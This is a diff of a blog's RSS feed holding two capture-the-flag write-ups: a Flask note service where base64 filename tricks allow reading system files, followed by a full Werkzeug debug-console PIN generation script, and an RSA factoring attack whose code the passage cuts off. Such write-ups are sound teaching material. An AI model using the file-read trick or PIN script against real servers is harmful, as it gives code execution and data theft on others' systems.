@@ -1,26 +1,321 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>Rookie Code Rumble CTF Writeup on Gabriel Yip</title>
-    <link>http://localhost:1313/en/posts/rcr-writeup/</link>
-    <description>Recent content in Rookie Code Rumble CTF Writeup on Gabriel Yip</description>
-    <generator>Hugo</generator>
-    <language>en-US</language>
-    <lastBuildDate>Tue, 10 Jun 2025 20:33:57 +1000</lastBuildDate>
-    <atom:link href="http://localhost:1313/en/posts/rcr-writeup/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>Note Service</title>
-      <link>http://localhost:1313/en/posts/rcr-writeup/note-service/</link>
-      <pubDate>Tue, 10 Jun 2025 20:33:57 +1000</pubDate>
-      <guid>http://localhost:1313/en/posts/rcr-writeup/note-service/</guid>
-      <description>&lt;h2 id=&#34;note-service&#34;&gt;Note-Service&lt;a href=&#34;#note-service&#34; class=&#34;anchor&#34; aria-hidden=&#34;true&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34; stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34;&#xA;      stroke-linecap=&#34;round&#34; stroke-linejoin=&#34;round&#34;&gt;&#xA;      &lt;path d=&#34;M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3&#34;&gt;&lt;/path&gt;&#xA;      &lt;line x1=&#34;8&#34; y1=&#34;12&#34; x2=&#34;16&#34; y2=&#34;12&#34;&gt;&lt;/line&gt;&#xA;   &lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;h3 id=&#34;-observation&#34;&gt;🫣 Observation&lt;a href=&#34;#-observation&#34; class=&#34;anchor&#34; aria-hidden=&#34;true&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34; stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34;&#xA;      stroke-linecap=&#34;round&#34; stroke-linejoin=&#34;round&#34;&gt;&#xA;      &lt;path d=&#34;M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3&#34;&gt;&lt;/path&gt;&#xA;      &lt;line x1=&#34;8&#34; y1=&#34;12&#34; x2=&#34;16&#34; y2=&#34;12&#34;&gt;&lt;/line&gt;&#xA;   &lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;&#xA;&lt;p&gt;We see a very simple flask website with upload and download function. When you upload a file on the website, it will save the file and change the title as the base64 of the first 50 bytes. Meaning if I uploaded a file named &lt;code&gt;abc.txt&lt;/code&gt; with content &lt;code&gt;abcdefg&lt;/code&gt;, the file will be saved as &lt;code&gt;YWJjZGVmZw==&lt;/code&gt; as the tite, with the content as &lt;code&gt;abcdefg&lt;/code&gt;.&lt;/p&gt;</description>
-    </item>
-    <item>
-      <title>3 RSA</title>
-      <link>http://localhost:1313/en/posts/rcr-writeup/3-rsa/</link>
-      <pubDate>Tue, 10 Jun 2025 15:47:44 +1000</pubDate>
-      <guid>http://localhost:1313/en/posts/rcr-writeup/3-rsa/</guid>
-      <description>&lt;h2 id=&#34;3-rsa&#34;&gt;3-RSA&lt;a href=&#34;#3-rsa&#34; class=&#34;anchor&#34; aria-hidden=&#34;true&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34; stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34;&#xA;      stroke-linecap=&#34;round&#34; stroke-linejoin=&#34;round&#34;&gt;&#xA;      &lt;path d=&#34;M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3&#34;&gt;&lt;/path&gt;&#xA;      &lt;line x1=&#34;8&#34; y1=&#34;12&#34; x2=&#34;16&#34; y2=&#34;12&#34;&gt;&lt;/line&gt;&#xA;   &lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;I did nothing much in this except asking AI (Gemini 2.5 Pro) about this. Surprisingly the prompt works the first time! Since the AI probably explains it better than me, here is the LLM response:&lt;/p&gt;</description>
-    </item>
-  </channel>
+	<channel>
+		<title> 📁 Rookie Code Rumble CTF Writeup on Gabriel Yip</title>
+		<link>http://localhost:1313/en/posts/rcr-writeup/</link>
+		<description>Recent content in  📁 Rookie Code Rumble CTF Writeup on Gabriel Yip</description>
+		<generator>Hugo -- gohugo.io</generator>
+		<language>en-US</language>
+		<lastBuildDate>Tue, 10 Jun 2025 15:47:44 +1000</lastBuildDate>
+		<atom:link href="http://localhost:1313/en/posts/rcr-writeup/index.xml" rel="self" type="application/rss+xml" />
+		
+		<item>
+			<title>Note Service</title>
+			<link>http://localhost:1313/en/posts/rcr-writeup/note-service/</link>
+			<pubDate>Tue, 10 Jun 2025 20:33:57 +1000</pubDate>
+			
+			<guid>http://localhost:1313/en/posts/rcr-writeup/note-service/</guid>
+			<description><![CDATA[%!s(<nil>)]]></description>
+			<content type="html"><![CDATA[<h2 id="note-service">Note-Service</h2>
+<h3 id="-observation">🫣 Observation</h3>
+<p>We see a very simple flask website with file upload and download function. When you upload a file on the website, it will save the file and change the file name as the base64 of the content&rsquo;s first 50 bytes. Meaning if I uploaded a file named <code>abc.txt</code> with content <code>abcdefg</code>, the file will be saved as <code>YWJjZGVmZw==</code> as the file name, with the content as <code>abcdefg</code>.</p>
+<p>Observation 1: If the file is not uploaded before, you cannot retrieve the file. Also, if the file already existed on the server, the uploaded file will not replace the original file.</p>
+<p>But why does these matter? Let&rsquo;s check out a snippet of the backend for the upload file and see where the vulnerability lies,</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>]) <span style="color:#75715e">#11</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>(): <span style="color:#75715e">#12</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>: <span style="color:#75715e">#13</span>
+</span></span><span style="display:flex;"><span>        print(request<span style="color:#f92672">.</span>files) <span style="color:#75715e">#14</span>
+</span></span><span style="display:flex;"><span>        note_content <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#34;note&#34;</span>]<span style="color:#f92672">.</span>stream<span style="color:#f92672">.</span>read() <span style="color:#75715e">#15</span>
+</span></span><span style="display:flex;"><span>        note_title <span style="color:#f92672">=</span> b64encode(note_content[:<span style="color:#ae81ff">50</span>])<span style="color:#f92672">.</span>decode() <span style="color:#75715e">#16</span>
+</span></span><span style="display:flex;"><span>        uploaded_files<span style="color:#f92672">.</span>add(note_title) <span style="color:#75715e">#17</span>
+</span></span><span style="display:flex;"><span>        print(note_title) <span style="color:#75715e">#18</span>
+</span></span><span style="display:flex;"><span>        print(note_content) <span style="color:#75715e">#19</span>
+</span></span><span style="display:flex;"><span>        flash(<span style="color:#e6db74">&#34;Your file has been successfully uploaded!&#34;</span>, <span style="color:#e6db74">&#34;success&#34;</span>) <span style="color:#75715e">#20</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(note_title): <span style="color:#75715e">#21</span>
+</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;The file </span><span style="color:#e6db74">{</span>note_title<span style="color:#e6db74">}</span><span style="color:#e6db74"> already exists!&#34;</span>, <span style="color:#e6db74">&#34;danger&#34;</span>) <span style="color:#75715e">#22</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>: <span style="color:#75715e">#23</span>
+</span></span><span style="display:flex;"><span>            open(note_title, <span style="color:#e6db74">&#34;wb&#34;</span>)<span style="color:#f92672">.</span>write(note_content) <span style="color:#75715e">#24</span>
+</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Your file has been written to! It has been saved with the title: </span><span style="color:#e6db74">{</span>note_title<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;success&#34;</span>) <span style="color:#75715e">#25</span>
+</span></span></code></pre></div><p>Notice Line #17? An array <code>uploaded_files</code> appends the file name no matter if the file existed already on the server or not! Meaning even if a file already existed on the server before, it will not replace the file with the one you uploaded. However you now can retrieve the file originally on the server.</p>
+<p>Observation 2: VERY IMPORTANT! Flask debug is on! and https://&lt;some.coolurl.com&gt;/console is out in the public!!! If you manage to cause an error (Just try to retrieve an empty file), you will get a snippet of the source code around the line the error was thrown. Most importantly, the path the backend server is in the error logs! From this, you will know the python script is located at <code>/a/very/strange/working/directory/server.py</code>! (sus!)</p>
+<h3 id="-think-process">🧠 Think process</h3>
+<p>With all those observations, An idea comes to my mind. Could we access ANY files other than the uploaded one? The answer is YES! (With a few exceptions). If we want to retrieve <code>/etc/passwd</code>, how would we do it?</p>
+<p>First, we would need to add <code>/etc/passwd</code> in the array <code>uploaded_files</code>.</p>
+<p>Check out this snippet of the server.py code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>        note_title <span style="color:#f92672">=</span> b64encode(note_content[:<span style="color:#ae81ff">50</span>])<span style="color:#f92672">.</span>decode() <span style="color:#75715e">#16</span>
+</span></span><span style="display:flex;"><span>        uploaded_files<span style="color:#f92672">.</span>add(note_title) <span style="color:#75715e">#17</span>
+</span></span></code></pre></div><p>What we want is a string, AFTER it being base64 encoded, it becomes <code>/etc/passwd</code>. Easy enough, right? We just need to run <code>b64decode(b'/etc/passwd')</code> in python and that&rsquo;s it!</p>
+<p>BUT this would produce an error. Specifically <code>binascii.Error: Incorrect padding</code>. For it to a valid base64 string, its length must be an increment of 4 and every character has to be <code>A-Z, a-z, 0-9, + or /</code>. We need to somehow turn this path (<code>/etc/passwd</code>) lengthed 11 now to a length 12 path. Easy enough! We just add a <code>/</code> in front, making the path <code>//etc/passwd</code>. This would let us access the file while fitting the criteria for a vaid base64 string.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> payload <span style="color:#f92672">=</span> b64decode(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;//etc/passwd&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> print(payload)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff\xf7\xad</span><span style="color:#e6db74">s</span><span style="color:#ae81ff">\xfa</span><span style="color:#e6db74">Z</span><span style="color:#ae81ff">\xb2\xcc\x1d</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;input.bin&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>     f<span style="color:#f92672">.</span>write(payload)
+</span></span></code></pre></div><p>Nice! Upload <code>input.bin</code> and it will show the file already existed! But since <code>//etc/passwd</code> is in the <code>uploaded_files</code> array, we could access <code>//etc/passwd</code> and see the content of file!</p>
+<p><img src="/images/etc-passwd.jpeg" alt="Photo of passwd"></p>
+<p>This means as long as the filepath is valid base64 string, we could access it! Nice! Let&rsquo;s try to retrieve <code>flag.txt</code> then!</p>
+<p>NOPE! Since <code>flag.txt</code> has a <code>.</code> in the title, it is an invalid base64 string. Not that easy huh&hellip; damn it!</p>
+<h3 id="solution">Solution</h3>
+<p>I stumble on this article about <a href="https://www.daehee.com/blog/werkzeug-console-pin-exploit">Werkzeug Console PIN Exploit</a>. tldr you need these variables to get the console PIN:</p>
+<pre tabindex="0"><code>probably_public_bits = [
+    username,
+    modname,
+    getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)),
+    getattr(mod, &#39;__file__&#39;, None),
+]
+
+private_bits = [
+    str(uuid.getnode()),
+    get_machine_id(),
+]
+</code></pre><p>For more info check the article <a href="https://www.daehee.com/blog/werkzeug-console-pin-exploit">here</a>.</p>
+<p>Using similar process above, I was able to retrieve the following files:</p>
+<p>Contents of //etc/passwd:</p>
+<pre tabindex="0"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+jacobi:x:100:65534::/nonexistent:/usr/sbin/nologin
+</code></pre><p>Contents of ////proc/net/arp:</p>
+<pre tabindex="0"><code>IP address       HW type     Flags       HW address            Mask     Device
+172.17.0.1       0x1         0x2         d6:d4:b8:80:74:e6     *        eth0
+</code></pre><p>Contents of //sys/class/net/eth0/address:</p>
+<pre tabindex="0"><code>6a:0a:ec:e5:6c:45
+</code></pre><p>Contents of ///proc/self/cmdline:</p>
+<pre tabindex="0"><code>/usr/local/bin/python server.py --boot_id_file ./bootid 
+</code></pre><p>Contents of /a/very/strange/working/directory/bootid:</p>
+<pre tabindex="0"><code>290a0861-7055-4ec3-9916-cdb1f7e47fcc
+</code></pre><p>Contents of ////proc/self/cgroup:</p>
+<pre tabindex="0"><code>0::/
+</code></pre><p>After retrieving all these files, we can finally piece everything together and generate the PIN for the console! Using this python script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> itertools
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> chain
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crack_md5</span>(username, modname, appname, flaskapp_path, node_uuid, machine_id):
+</span></span><span style="display:flex;"><span>    h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5()
+</span></span><span style="display:flex;"><span>    crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crack_sha1</span>(username, modname, appname, flaskapp_path, node_uuid, machine_id):
+</span></span><span style="display:flex;"><span>    h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1()
+</span></span><span style="display:flex;"><span>    crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crack</span>(hasher, username, modname, appname, flaskapp_path, node_uuid, machine_id):
+</span></span><span style="display:flex;"><span>    probably_public_bits <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>            username,
+</span></span><span style="display:flex;"><span>            modname,
+</span></span><span style="display:flex;"><span>            appname,
+</span></span><span style="display:flex;"><span>            flaskapp_path ]
+</span></span><span style="display:flex;"><span>    private_bits <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>            node_uuid,
+</span></span><span style="display:flex;"><span>            machine_id ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    h <span style="color:#f92672">=</span> hasher
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> bit <span style="color:#f92672">in</span> chain(probably_public_bits, private_bits):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> bit:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(bit, str):
+</span></span><span style="display:flex;"><span>            bit <span style="color:#f92672">=</span> bit<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>        h<span style="color:#f92672">.</span>update(bit)
+</span></span><span style="display:flex;"><span>    h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cookiesalt&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    cookie_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;__wzd&#39;</span> <span style="color:#f92672">+</span> h<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">20</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    num <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> num <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pinsalt&#39;</span>)
+</span></span><span style="display:flex;"><span>        num <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%09d</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> int(h<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>))[:<span style="color:#ae81ff">9</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    rv <span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> rv <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> group_size <span style="color:#f92672">in</span> <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> len(num) <span style="color:#f92672">%</span> group_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                rv <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;-&#39;</span><span style="color:#f92672">.</span>join(num[x:x <span style="color:#f92672">+</span> group_size]<span style="color:#f92672">.</span>rjust(group_size, <span style="color:#e6db74">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>                              <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(num), group_size))
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            rv <span style="color:#f92672">=</span> num
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(rv)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    usernames <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;jacobi&#39;</span>]
+</span></span><span style="display:flex;"><span>    modnames <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;flask.app&#39;</span>, <span style="color:#e6db74">&#39;werkzeug.debug&#39;</span>]
+</span></span><span style="display:flex;"><span>    appnames <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;wsgi_app&#39;</span>, <span style="color:#e6db74">&#39;DebuggedApplication&#39;</span>, <span style="color:#e6db74">&#39;Flask&#39;</span>]
+</span></span><span style="display:flex;"><span>    flaskpaths <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;/usr/local/lib/python3.13/site-packages/flask/app.py&#39;</span>]
+</span></span><span style="display:flex;"><span>    nodeuuids <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;116595156675653&#39;</span>]
+</span></span><span style="display:flex;"><span>    machineids <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;290a0861-7055-4ec3-9916-cdb1f7e47fcc&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Generate all possible combinations of values</span>
+</span></span><span style="display:flex;"><span>    combinations <span style="color:#f92672">=</span> itertools<span style="color:#f92672">.</span>product(usernames, modnames, appnames, flaskpaths, nodeuuids, machineids)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Iterate over the combinations and call the crack() function for each one</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> combo <span style="color:#f92672">in</span> combinations:
+</span></span><span style="display:flex;"><span>        username, modname, appname, flaskpath, nodeuuid, machineid <span style="color:#f92672">=</span> combo
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;==========================================================================&#39;</span>)
+</span></span><span style="display:flex;"><span>        crack_sha1(username, modname, appname, flaskpath, nodeuuid, machineid)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>combo<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;==========================================================================&#39;</span>)
+</span></span></code></pre></div><p>The first generated pin is</p>
+<pre tabindex="0"><code>==========================================================================
+684-847-740
+(&#39;jacobi&#39;, &#39;flask.app&#39;, &#39;wsgi_app&#39;, &#39;/usr/local/lib/python3.13/site-packages/flask/app.py&#39;, &#39;116595156675653&#39;, &#39;290a0861-7055-4ec3-9916-cdb1f7e47fcc&#39;)
+==========================================================================
+</code></pre><p>and if you enter it in the pin prompt, IT WORKS!! OMG! We just need to retrieve le flag. Inside the debug console, We enter this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> print(open(<span style="color:#e6db74">&#39;flag.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read())
+</span></span><span style="display:flex;"><span>RCR{rC3_Just_t0_ReaD_4_fiL3<span style="color:#960050;background-color:#1e0010">?</span>}
+</span></span></code></pre></div><h3 id="other-useful-resource-for-werkzeug-console-pin-exploit">Other useful resource for Werkzeug Console PIN Exploit:</h3>
+<p>DANGEROUS Python Flask Debug Mode Vulnerabilities - John Hammond
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/jwBRgaIRdgs?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
+</p>
+]]></content>
+		</item>
+		
+		<item>
+			<title>3-RSA</title>
+			<link>http://localhost:1313/en/posts/rcr-writeup/3-rsa/</link>
+			<pubDate>Tue, 10 Jun 2025 15:47:44 +1000</pubDate>
+			
+			<guid>http://localhost:1313/en/posts/rcr-writeup/3-rsa/</guid>
+			<description><![CDATA[%!s(<nil>)]]></description>
+			<content type="html"><![CDATA[<h2 id="3-rsa">3-RSA</h2>
+<blockquote>
+<p>I did nothing much in this except asking AI (Gemini 2.5 Pro) about this. Surprisingly the prompt works the first time! Since the AI probably explains it better than me, here is the LLM response:</p></blockquote>
+<p>The vulnerability in this code lies in the predictable way the prime numbers for the RSA moduli were generated. The primes <code>a, b, c</code> and <code>x, y, z</code> are not random; they form <strong>arithmetic progressions</strong>. This mathematical relationship allows an attacker to link the three public keys (<code>n1</code>, <code>n2</code>, <code>n3</code>) together, ultimately revealing all the secret prime factors.</p>
+<h3 id="the-vulnerability-arithmetic-progressions">The Vulnerability: Arithmetic Progressions</h3>
+<p>The script contains these two critical lines:<br>
+<code>assert z - y == y - x</code> and
+<code>assert c - b == b - a</code></p>
+<p>These assertions mean that <code>a, b, c</code> and <code>x, y, z</code> are sets of three primes in arithmetic progression. This implies:</p>
+<ul>
+<li>\(b = \frac{a+c}{2}\)</li>
+<li>\(y = \frac{x+z}{2}\)</li>
+</ul>
+<p>This seemingly innocent constraint creates a fatal link between the three RSA moduli.</p>
+<hr>
+<h3 id="the-attack-a-mathematical-approach">The Attack: A Mathematical Approach</h3>
+<p>The attack leverages this relationship to factor the moduli.</p>
+<ol>
+<li>
+<p><strong>Relating the Moduli</strong>: We can express the second public key, <code>n2</code>, in terms of the primes from the other two keys:
+\(n_2 = b \cdot y = (\frac{a+c}{2}) \cdot (\frac{x+z}{2})\)
+\(4n_2 = (a+c)(x+z) = ax + az + cx + cz\)</p>
+</li>
+<li>
+<p><strong>Substituting Known Values</strong>: We know that \(n_1 = a \cdot x\) and \(n_3 = c \cdot z\). Substituting these into the equation gives:
+\(4n_2 = n_1 + az + cx + n_3\)</p>
+</li>
+<li>
+<p><strong>Forming a Quadratic Equation</strong>: Let&rsquo;s isolate the unknown terms. Let \(S = 4n_2 - n_1 - n_3\).
+\(S = az + cx\)</p>
+<p>We now have a system of equations involving two unknown products, <code>az</code> and <code>cx</code>:</p>
+<ul>
+<li>Sum: \(az + cx = S\)</li>
+<li>Product: \((az) \cdot (cx) = (ax) \cdot (cz) = n_1 \cdot n_3\)</li>
+</ul>
+<p>Any two numbers with a known sum and product are the roots of a simple quadratic equation:
+\(K^2 - (\text{sum of roots})K + (\text{product of roots}) = 0\)
+\(K^2 - S \cdot K + n_1n_3 = 0\)</p>
+</li>
+<li>
+<p><strong>Solving for the Primes</strong>:</p>
+<ul>
+<li>We can solve this quadratic equation for <code>K</code> using the quadratic formula. The two roots will be \(K_1 = a \cdot z\) and \(K_2 = c \cdot x\).</li>
+<li>Once we have these products, we can find the individual prime factors using the greatest common divisor (GCD):
+<ul>
+<li><code>a = gcd(n1, K1)</code> which is <code>gcd(a*x, a*z)</code></li>
+<li><code>c = gcd(n3, K2)</code> which is <code>gcd(c*z, c*x)</code></li>
+</ul>
+</li>
+<li>With <code>a</code> and <code>c</code> found, we can easily find the remaining primes (<code>x, z, b, y</code>).</li>
+</ul>
+</li>
+<li>
+<p><strong>Decryption</strong>: After recovering all six prime factors, we can compute the totient (<code>phi</code>) for each modulus, calculate the private keys, and decrypt the three parts of the flag.</p>
+</li>
+</ol>
+<hr>
+<h3 id="solution-code">Solution Code</h3>
+<p>This Python script implements the attack described above to factor the public keys and retrieve the full flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> math
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Public values from the output</span>
+</span></span><span style="display:flex;"><span>flag1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">11492112663703232088998486179734356177771567146805158417960125003237116439231226258659875708797399817744931063299748318101064301294216136873298987081319490145937107048642337728535911253970741196295376922168448878976469589443846093196421830469617589107742470128537185244364757796970083415861786554196168517831966671244906283809132068677607882319793466679026787758887577990349442662100930139100336136175243045045966567615399099883892136366882468101432422494155346928263194773441199700185161047426593464784067654388038794015818789112382156282633137679906682839029587361557507124817043427634040108459655059076740987192384</span>
